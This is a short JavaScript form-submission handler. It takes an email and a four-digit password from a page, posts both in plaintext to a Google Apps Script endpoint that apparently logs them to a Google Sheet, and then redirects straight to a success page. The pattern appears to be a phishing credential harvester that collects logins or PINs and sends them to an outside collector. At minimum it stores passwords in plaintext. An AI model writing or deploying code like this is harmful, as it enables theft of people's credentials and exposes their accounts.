// Handle the form submission and send data to Google Sheets
function handleSubmit(event) {
    event.preventDefault(); // Prevent the form from submitting the traditional way

    // Get form data
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Validate the password to be 4 digits (0-9)
    const passwordRegex = /^\d{4}$/; // Regex to match exactly 4 digits

    if (!passwordRegex.test(password)) {
        // Show error message if password does not match the requirement
        document.getElementById('password-error').style.display = 'block';
        return;  // Prevent form submission
    } else {
        // Hide the error message if password is valid
        document.getElementById('password-error').style.display = 'none';
    }

    // Prepare the data to send to Google Sheets
    const formData = new FormData();
    formData.append("email", email);
    formData.append("password", password);

    // Send data to Google Sheets using fetch
    fetch('https://script.google.com/macros/s/AKfycbwb-eqY_s93FuDE_RzeUXc710tUDcoCmrLFklqc18sKYwNlXj0yWr7CAJQEr9Icgg0QFA/exec', {
        method: 'POST',
        body: formData
    })
    .catch(error => {
        console.error("Error:", error); // If submission fails
        alert("There was an error with the submission. Please try again.");
    });

    // Redirect immediately to the success page
    window.location.href = "success.html";  // This takes the user to success.html
}
